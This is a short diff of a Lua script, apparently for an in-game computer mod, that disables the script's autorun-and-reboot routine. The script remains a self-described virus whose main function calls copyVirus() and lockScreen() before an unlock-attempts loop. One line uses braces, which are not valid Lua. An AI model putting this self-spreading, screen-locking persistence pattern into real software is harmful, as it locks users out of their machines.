@@ -17,11 +17,11 @@ function Sleep(timeout)
   until computer.uptime() >= deadline
 end
 
-function EnableAutorun()
-      fs.setAutorunEnabled(true)
-      computer.shutdown(true)
-      print("Autorun activé")
-end
+--function EnableAutorun()
+--      fs.setAutorunEnabled(true)
+--      computer.shutdown(true)
+--      print("Autorun activé")
+--end
 
 function lockScreen()
   if(fs.isAutorunEnabled()) {
@@ -79,7 +79,7 @@ function unlock()
 end
 
 function main()
-  EnableAutorun()
+  --EnableAutorun()
   copyVirus()
   lockScreen()
   while attempts < MAX_ATTEMPTS do
